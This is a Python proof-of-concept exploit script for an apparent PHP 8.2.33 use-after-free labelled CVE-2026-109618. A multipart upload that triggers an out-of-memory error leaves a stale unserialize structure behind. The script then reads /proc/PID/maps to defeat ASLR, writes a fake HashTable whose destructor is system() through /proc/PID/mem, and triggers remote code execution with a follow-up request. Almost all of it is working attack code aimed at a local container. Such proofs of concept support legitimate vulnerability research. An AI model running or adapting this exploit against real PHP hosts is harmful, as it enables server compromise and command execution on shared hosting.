#!/usr/bin/env python3
"""
Chain D RCE Exploit for CVE-2026-109618
========================================

OOM in rfc1867_post_handler() → longjmp bailout → stale BG(serialize)
cache (php_var_unserialize_init REUSE path) → UAF → controlled dtor
chain → zend_array_destroy → system() → RCE

Target: PHP 8.2.33, Apache mod_php (prefork MPM), no CFI/ASAN
Attack model: shared-hosting co-tenant with /proc/PID/{maps,mem} access

Exploitation flow:
  1. Pre-warm: upload_progress POST creates session file with data
  2. OOM bomb: multipart upload triggers OOM in rfc1867_post_handler.
     The session was decoded (php_var_unserialize_init) within
     serialize_lock scope, so php_var_unserialize_destroy returns
     WITHOUT clearing BG(cached_var_unserialize) or its refcount.
     ZMM shutdown(full=false) keeps the main chunk mapped.
     Result: BG+0x350 = S (stale struct addr in ZMM), BG+0x358 = 1
  3. ASLR bypass: read /proc/PID/maps for libphp + libc bases
  4. Read BG+0x350 via /proc/PID/mem to find stale struct address S
  5. Write exploit payload at S via /proc/PID/mem (ZMM heap region
     only — no writes to .data/.bss/.got segments)
  6. Write minimal session file so session decode succeeds cleanly
  7. Follow-up request: session decode → php_var_unserialize_init
     takes REUSE path (returns stale S) → unserialize uses controlled
     struct → php_var_unserialize_destroy walks fake dtor chain →
     rc_dtor_func → zend_array_destroy → zend_hash_destroy →
     call *pDestructor(entry) = system(cmd) → RCE

Memory layout at stale address S:
  S+0x000: php_unserialize_data_t struct header
  S+0x038: inline var_entries (counter=0, clean for new unserialize)
  S+0x800: fake var_dtor_entries block (first_dtor, last_dtor)
  S+0x810: entry[0]: IS_ARRAY zval → S+0x900 (fake HashTable)
  S+0x900: fake HashTable with pDestructor = system()
  S+0xA00: fake packed entry = command string bytes

Why serialize_lock makes this work:
  php_var_unserialize_destroy checks serialize_lock FIRST.
  If serialize_lock != 0, it ALWAYS takes the DESTROY path
  (walks dtor chain), regardless of refcount. Since destroy is
  called from within ps_srlzr_decode_php where serialize_lock
  is incremented, the dtor chain is ALWAYS walked.

For authorized security research only.
"""

import socket
import struct
import subprocess
import sys
import time

# ── Target configuration ─────────────────────────────────────────────
HOST = "127.0.0.1"
PORT = 18081
CONTAINER = "php2shell-apache"
BOUNDARY = "CHAIN_D_RCE"
SID = "chaindrce0123456789abcdef01"

# nm offsets from libphp.so (PHP 8.2.33)
BG_NM_OFFSET = 0xf4b020       # basic_globals (BSS)
SYSTEM_LIBC_OFFSET = 0x053090  # system() in libc

# Command to execute
RCE_CMD = "id > /tmp/pwned 2>&1"


# ── Helpers ───────────────────────────────────────────────────────────

def docker_exec(cmd, timeout=30):
    r = subprocess.run(
        ["docker", "exec", CONTAINER, "bash", "-c", cmd],
        capture_output=True, text=True, timeout=timeout)
    return r.stdout.strip(), r.stderr.strip()


def get_worker_pid():
    out, _ = docker_exec("pgrep -u www-data apache2 | head -1")
    return out


def get_proc_starttime(pid):
    out, _ = docker_exec(f"cat /proc/{pid}/stat 2>/dev/null")
    parts = out.split()
    return parts[21] if len(parts) > 21 else None


def get_library_bases(pid):
    out, _ = docker_exec(f"cat /proc/{pid}/maps")
    libphp = libc = None
    for line in out.split("\n"):
        if "libphp" in line and "r--p" in line and " 00000000 " in line:
            libphp = int(line.split("-")[0], 16)
        if ("/libc.so" in line or "/libc-" in line) and " r--p " in line and " 00000000 " in line and not libc:
            libc = int(line.split("-")[0], 16)
    return libphp, libc


def check_addr_mapped(pid, addr):
    out, _ = docker_exec(f"cat /proc/{pid}/maps")
    for line in out.split("\n"):
        if " rw-p " not in line:
            continue
        parts = line.split()
        start_s, end_s = parts[0].split("-")
        start, end = int(start_s, 16), int(end_s, 16)
        if start <= addr < end:
            return True, start, end, line.strip()
    return False, 0, 0, ""


def read_u64(pid, addr):
    out, _ = docker_exec(
        f"perl /tmp/readmem.pl {pid} 0x{addr:x}", timeout=5)
    if out and len(out) >= 16:
        return int(out.strip(), 16)
    return None


def write_mem(pid, addr, data_hex):
    out, _ = docker_exec(
        f"perl /tmp/writemem.pl {pid} 0x{addr:x} {data_hex}", timeout=5)
    return "OK" in out


def send_raw(data, timeout=120):
    s = socket.create_connection((HOST, PORT), timeout=timeout)
    off = 0
    while off < len(data):
        s.sendall(data[off:off+65536])
        off += 65536
    s.settimeout(30)
    resp = b""
    while True:
        try:
            d = s.recv(65536)
            if not d:
                break
            resp += d
        except socket.timeout:
            break
    s.close()
    return resp


def get_http_status(resp):
    if not resp:
        return "NO_RESPONSE"
    return resp.split(b"\r\n", 1)[0].decode("latin1", "replace")


def install_helpers():
    docker_exec("cat > /tmp/readmem.pl << 'PERL'\n"
        '#!/usr/bin/perl\n'
        'use strict;\n'
        'my ($pid, $addr) = @ARGV;\n'
        '$addr = hex($addr) if $addr =~ /^0x/;\n'
        'open(my $fh, "<:raw", "/proc/$pid/mem") or die "open: $!";\n'
        'seek($fh, $addr, 0) or die "seek: $!";\n'
        'my $buf;\n'
        'read($fh, $buf, 8) == 8 or die "read: $!";\n'
        'printf "%016x\\n", unpack("Q<", $buf);\n'
        'close($fh);\n'
        'PERL\n'
        "chmod +x /tmp/readmem.pl")

    docker_exec("cat > /tmp/writemem.pl << 'PERL'\n"
        '#!/usr/bin/perl\n'
        'use strict;\n'
        'my ($pid, $addr_str, $hexdata) = @ARGV;\n'
        'my $addr = ($addr_str =~ /^0x/) ? hex($addr_str) : $addr_str + 0;\n'
        'my $data = pack("H*", $hexdata);\n'
        'open(my $fh, "+<:raw", "/proc/$pid/mem") or die "open: $!";\n'
        'seek($fh, $addr, 0) or die "seek: $!";\n'
        'my $written = syswrite($fh, $data);\n'
        'die "write: $!" unless defined $written;\n'
        'close($fh);\n'
        'printf "OK %d bytes at 0x%x\\n", $written, $addr;\n'
        'PERL\n'
        "chmod +x /tmp/writemem.pl")


# ── Request builders ─────────────────────────────────────────────────

def build_prewarm_request():
    parts = []
    parts.append(
        f"--{BOUNDARY}\r\n"
        f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n'
        f"\r\nprewarm\r\n")
    for i in range(5):
        fname = chr(65 + i) * 20
        parts.append(
            f"--{BOUNDARY}\r\n"
            f'Content-Disposition: form-data; name="f{i}"; filename="{fname}"\r\n'
            f"Content-Type: application/octet-stream\r\n"
            f"\r\nX\r\n")
    parts.append(f"--{BOUNDARY}--\r\n")
    body = "".join(parts).encode("latin1")
    return (
        f"POST /index.php HTTP/1.1\r\n"
        f"Host: {HOST}\r\n"
        f"Content-Type: multipart/form-data; boundary={BOUNDARY}\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Cookie: PHPSESSID={SID}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode() + body


def build_oom_request():
    parts = []
    parts.append(
        f"--{BOUNDARY}\r\n"
        f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n'
        f"\r\noom_bomb\r\n")
    for i in range(14000):
        fname = chr(65 + (i % 26)) * max(1, 500 - len(str(i))) + str(i)
        parts.append(
            f"--{BOUNDARY}\r\n"
            f'Content-Disposition: form-data; name="f{i}"; filename="{fname}"\r\n'
            f"Content-Type: application/octet-stream\r\n"
            f"\r\nX\r\n")
    parts.append(f"--{BOUNDARY}--\r\n")
    body = "".join(parts).encode("latin1")
    return (
        f"POST /index.php HTTP/1.1\r\n"
        f"Host: {HOST}\r\n"
        f"Content-Type: multipart/form-data; boundary={BOUNDARY}\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Cookie: PHPSESSID={SID}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode() + body


def build_followup_request():
    parts = []
    parts.append(
        f"--{BOUNDARY}\r\n"
        f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n'
        f"\r\ntrigger\r\n")
    for i in range(3):
        parts.append(
            f"--{BOUNDARY}\r\n"
            f'Content-Disposition: form-data; name="f{i}"; filename="t{i}.txt"\r\n'
            f"Content-Type: application/octet-stream\r\n"
            f"\r\nX\r\n")
    parts.append(f"--{BOUNDARY}--\r\n")
    body = "".join(parts).encode("latin1")
    return (
        f"POST /index.php HTTP/1.1\r\n"
        f"Host: {HOST}\r\n"
        f"Content-Type: multipart/form-data; boundary={BOUNDARY}\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Cookie: PHPSESSID={SID}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode() + body


# ── Payload builder ──────────────────────────────────────────────────

def build_payload(struct_addr, system_addr):
    """
    Build the exploit payload to write at the stale struct address S.

    Memory layout:
      S+0x000: php_unserialize_data_t header
      S+0x038: inline var_entries (clean)
      S+0x800: fake var_dtor_entries block
      S+0x900: fake HashTable
      S+0xA00: fake packed entry (command string)
    """
    S = struct_addr
    payload = bytearray(0xA80)  # large enough for all structures

    # ── Struct header at S+0x000 ──
    # +0x00: var_entries first pointer → inline area at S+0x38
    struct.pack_into("<Q", payload, 0x00, S + 0x38)
    # +0x08: first_dtor → fake dtor block at S+0x800
    struct.pack_into("<Q", payload, 0x08, S + 0x800)
    # +0x10: last_dtor → same block
    struct.pack_into("<Q", payload, 0x10, S + 0x800)
    # +0x18 through +0x2F: zero (cur_depth, allowed_classes, etc.)
    # +0x30: max_depth = 64
    struct.pack_into("<I", payload, 0x30, 64)
    # +0x34: zero

    # ── Inline var_entries at S+0x38 ──
    # +0x00 (S+0x38): counter = 0 (clean for new unserialize)
    struct.pack_into("<Q", payload, 0x38, 0)
    # +0x08 (S+0x40): next = NULL (no overflow blocks)
    struct.pack_into("<Q", payload, 0x40, 0)
    # +0x10 (S+0x48): data area (will be filled by var_push)

    # ── Fake var_dtor_entries block at S+0x800 ──
    # +0x00: used_slots = 1
    struct.pack_into("<Q", payload, 0x800, 1)
    # +0x08: next = NULL
    struct.pack_into("<Q", payload, 0x808, 0)

    # ── entry[0] at S+0x810: IS_ARRAY zval ──
    # zval layout: value(8) + u1.type_info(4) + u2(4) = 16 bytes
    # value = pointer to fake HashTable at S+0x900
    struct.pack_into("<Q", payload, 0x810, S + 0x900)
    # u1.type_info: type=IS_ARRAY(7), type_flags=IS_TYPE_REFCOUNTED|COLLECTABLE(0x0C)
    # Full type_info = 0x00000C07
    struct.pack_into("<I", payload, 0x818, 0x00000C07)
    # u2 = 0 (must NOT be 1 or 2 to avoid special paths in var_destroy)
    struct.pack_into("<I", payload, 0x81C, 0)

    # ── Fake HashTable at S+0x900 ──
    # +0x00: gc.refcount = 1 (GC_DELREF makes it 0 → triggers destruction)
    struct.pack_into("<I", payload, 0x900, 1)
    # +0x04: gc.u.type_info = IS_ARRAY(7)
    struct.pack_into("<I", payload, 0x904, 7)
    # +0x08: u.v.flags = HASH_FLAG_PACKED(0x04)
    payload[0x908] = 0x04
    # +0x09-0x0B: zero
    # +0x0C: nTableMask = HT_MIN_MASK = 0xFFFFFFFE
    struct.pack_into("<I", payload, 0x90C, 0xFFFFFFFE)
    # +0x10: arPacked = S+0xA00
    struct.pack_into("<Q", payload, 0x910, S + 0xA00)
    # +0x18: nNumUsed = 1
    struct.pack_into("<I", payload, 0x918, 1)
    # +0x1C: nNumOfElements = 1
    struct.pack_into("<I", payload, 0x91C, 1)
    # +0x20: nTableSize = 2
    struct.pack_into("<I", payload, 0x920, 2)
    # +0x24: nInternalPointer = 0
    struct.pack_into("<I", payload, 0x924, 0)
    # +0x28: nNextFreeElement = ZEND_LONG_MIN
    struct.pack_into("<q", payload, 0x928, -0x8000000000000000)
    # +0x30: pDestructor = system()
    struct.pack_into("<Q", payload, 0x930, system_addr)

    # ── Fake packed entry at S+0xA00 (command string) ──
    cmd_bytes = RCE_CMD.encode("ascii") + b"\x00"
    if len(cmd_bytes) > 64:
        cmd_bytes = cmd_bytes[:63] + b"\x00"
    for i, b in enumerate(cmd_bytes):
        payload[0xA00 + i] = b
    # Byte 8 of the entry must be non-zero for zend_hash_destroy's
    # IS_UNDEF check: cmpb $0x0,0x8(%rbp)
    if len(cmd_bytes) <= 8:
        payload[0xA08] = 0x41  # 'A'

    return bytes(payload)


# ── Main exploit ─────────────────────────────────────────────────────

def main():
    print("=" * 70)
    print("  Chain D RCE — CVE-2026-109618")
    print("  OOM → stale BG(serialize) → UAF dtor chain → system()")
    print("=" * 70)

    # ── Step 0: Setup ──
    print("\n[0] Setup")
    install_helpers()
    docker_exec("rm -f /tmp/sess_* /tmp/pwned")
    send_raw(f"GET /index.php HTTP/1.1\r\nHost: {HOST}\r\nConnection: close\r\n\r\n".encode())
    time.sleep(0.3)

    pid = get_worker_pid()
    stime = get_proc_starttime(pid)
    libphp_base, libc_base = get_library_bases(pid)
    if not pid or not libphp_base or not libc_base:
        print("    [!] Failed to get worker PID or library bases")
        return 1

    bg_addr = libphp_base + BG_NM_OFFSET
    system_addr = libc_base + SYSTEM_LIBC_OFFSET
    print(f"    Worker PID:   {pid}")
    print(f"    libphp base:  0x{libphp_base:x}")
    print(f"    libc base:    0x{libc_base:x}")
    print(f"    system():     0x{system_addr:x}")
    print(f"    BG:           0x{bg_addr:x}")

    # ── Step 1: Pre-warm ──
    print(f"\n[1] Pre-warm: creating session data (SID={SID})")
    resp = send_raw(build_prewarm_request())
    print(f"    {get_http_status(resp)}")
    time.sleep(0.3)

    out, _ = docker_exec(f"wc -c < /tmp/sess_{SID} 2>/dev/null")
    print(f"    Session file: {out} bytes")

    # Verify BG state after pre-warm (should have stale cache from session decode)
    cached_ptr = read_u64(pid, bg_addr + 0x350)
    refcount = read_u64(pid, bg_addr + 0x358)
    print(f"    BG+0x350 (cached): 0x{cached_ptr:016x}" if cached_ptr is not None else "    BG+0x350: UNREADABLE")
    print(f"    BG+0x358 (refcnt): {refcount}" if refcount is not None else "    BG+0x358: UNREADABLE")

    if not cached_ptr or cached_ptr == 0:
        print("    [!] BG cached pointer is NULL — pre-warm did not create session state")
        print("    Continuing anyway (OOM request will create it)...")

    # ── Step 2: OOM bomb ──
    print(f"\n[2] OOM bomb (14000 files, 500-char names)")
    oom_req = build_oom_request()
    print(f"    Request size: {len(oom_req) / 1024 / 1024:.1f} MB")
    resp = send_raw(oom_req)
    print(f"    {get_http_status(resp)}")
    time.sleep(0.5)

    # Verify worker survived
    pid2 = get_worker_pid()
    stime2 = get_proc_starttime(pid2)
    if pid2 != pid or stime2 != stime:
        print(f"    [!] Worker changed: {pid}→{pid2}")
        pid = pid2
        libphp_base, libc_base = get_library_bases(pid)
        if not libphp_base or not libc_base:
            print("    [!] Cannot resolve new worker's addresses")
            return 1
        bg_addr = libphp_base + BG_NM_OFFSET
        system_addr = libc_base + SYSTEM_LIBC_OFFSET
        stime = get_proc_starttime(pid)

    # ── Step 3: Read stale state ──
    print(f"\n[3] Reading stale BG state")
    serialize_lock = read_u64(pid, bg_addr + 0x338)
    cached_ptr = read_u64(pid, bg_addr + 0x350)
    refcount = read_u64(pid, bg_addr + 0x358)

    print(f"    BG+0x338 (serialize_lock): {serialize_lock}")
    print(f"    BG+0x350 (cached_ptr):     0x{cached_ptr:016x}" if cached_ptr else "    BG+0x350: NULL")
    print(f"    BG+0x358 (refcount):       {refcount}")

    if not cached_ptr or cached_ptr == 0:
        print("    [!] FATAL: Stale struct pointer is NULL")
        print("    The session decode cleanup succeeded — OOM didn't")
        print("    interrupt at the right time. Try again.")
        return 1

    if refcount != 1:
        print(f"    [!] WARNING: Unexpected refcount {refcount} (expected 1)")

    S = cached_ptr
    mapped, rg_start, rg_end, rg_line = check_addr_mapped(pid, S)
    if not mapped:
        print(f"    [!] FATAL: S=0x{S:x} is NOT in a mapped rw-p region!")
        return 1

    print(f"    [+] S = 0x{S:x}")
    print(f"    [+] In region: 0x{rg_start:x}-0x{rg_end:x} ({(rg_end-rg_start)//1024}KB rw-p)")

    # ── Step 4: Write payload ──
    print(f"\n[4] Writing exploit payload at S=0x{S:x}")
    payload = build_payload(S, system_addr)
    payload_hex = payload.hex()

    # Write in chunks (docker exec has argument limits)
    CHUNK = 2048  # bytes per write
    total = len(payload)
    for off in range(0, total, CHUNK):
        chunk_data = payload_hex[off*2:(off+CHUNK)*2]
        if not chunk_data or all(c == '0' for c in chunk_data):
            # Skip zero-only chunks (most of the padding area)
            # But we still need to write the struct header and payload areas
            if off < 0x48 or (0x7F0 <= off < 0xA80):
                pass  # write these
            else:
                continue
        ok = write_mem(pid, S + off, chunk_data)
        if not ok:
            print(f"    [!] Write failed at S+0x{off:x}")
            return 1
    print(f"    [+] Payload written ({total} bytes)")

    # Verify critical fields
    v_first_dtor = read_u64(pid, S + 0x08)
    v_last_dtor = read_u64(pid, S + 0x10)
    v_dtor_slots = read_u64(pid, S + 0x800)
    v_entry_val = read_u64(pid, S + 0x810)
    v_pDestructor = read_u64(pid, S + 0x930)
    print(f"    Verify: first_dtor = 0x{v_first_dtor:x} (expect 0x{S+0x800:x})")
    print(f"    Verify: last_dtor  = 0x{v_last_dtor:x} (expect 0x{S+0x800:x})")
    print(f"    Verify: dtor_slots = {v_dtor_slots} (expect 1)")
    print(f"    Verify: entry val  = 0x{v_entry_val:x} (expect 0x{S+0x900:x})")
    print(f"    Verify: pDestructor= 0x{v_pDestructor:x} (expect 0x{system_addr:x})")

    if v_pDestructor != system_addr:
        print("    [!] FATAL: pDestructor verification failed!")
        return 1
    print(f"    [+] Payload verified")

    # ── Step 5: Write session file ──
    print(f"\n[5] Writing minimal session file")
    # Simple session data that the unserializer can handle cleanly
    sess_data = 'x|s:3:"rce";'
    docker_exec(f"printf '%s' '{sess_data}' > /tmp/sess_{SID}")
    docker_exec(f"chown www-data:www-data /tmp/sess_{SID}")
    out, _ = docker_exec(f"cat /tmp/sess_{SID}")
    print(f"    Session data: {out}")

    # ── Step 6: Trigger ──
    print(f"\n[6] Sending follow-up request (trigger)")
    print(f"    Chain: session_start → ps_srlzr_decode_php →")
    print(f"    php_var_unserialize_init (REUSE S) →")
    print(f"    php_var_unserialize → php_var_unserialize_destroy →")
    print(f"    var_destroy → rc_dtor_func → zend_array_destroy →")
    print(f"    zend_hash_destroy → call *pDestructor = system(cmd)")
    print(f"    Command: {RCE_CMD}")

    try:
        resp = send_raw(build_followup_request(), timeout=30)
        status = get_http_status(resp)
        print(f"    Response: {status}")
    except Exception as e:
        print(f"    Connection error: {e} (expected — worker crashes after system())")

    time.sleep(1)

    # ── Step 7: Verify RCE ──
    print(f"\n[7] Checking RCE result")
    pid3 = get_worker_pid()
    if pid3 != pid:
        print(f"    [+] Worker crashed (PID {pid} → {pid3}) — expected after exploit")
    else:
        print(f"    Worker PID unchanged ({pid})")

    out, _ = docker_exec("cat /tmp/pwned 2>/dev/null")
    if out:
        print(f"    [+] RCE CONFIRMED!")
        print(f"    /tmp/pwned contents:")
        for line in out.split("\n"):
            print(f"      {line}")
        print(f"\n{'=' * 70}")
        print(f"  EXPLOIT SUCCESSFUL — Chain D RCE achieved")
        print(f"  Vulnerability chain: OOM → stale BG(serialize) →")
        print(f"  UAF dtor chain → zend_array_destroy → system()")
        print(f"{'=' * 70}")
        return 0
    else:
        print(f"    [-] /tmp/pwned not found — RCE not confirmed")
        print(f"    Possible causes:")
        print(f"    - New ZMM allocations overwrote payload at S")
        print(f"    - Session data unserialize crashed before var_destroy")
        print(f"    - system() failed to execute")

        # Debug: check if worker is alive and read some state
        if pid3 != pid:
            new_libphp, _ = get_library_bases(pid3)
            if new_libphp:
                new_bg = new_libphp + BG_NM_OFFSET
                c = read_u64(pid3, new_bg + 0x350)
                r = read_u64(pid3, new_bg + 0x358)
                print(f"\n    New worker BG+0x350: 0x{c:016x}" if c else "")
                print(f"    New worker BG+0x358: {r}" if r is not None else "")
        return 1


if __name__ == "__main__":
    sys.exit(main())
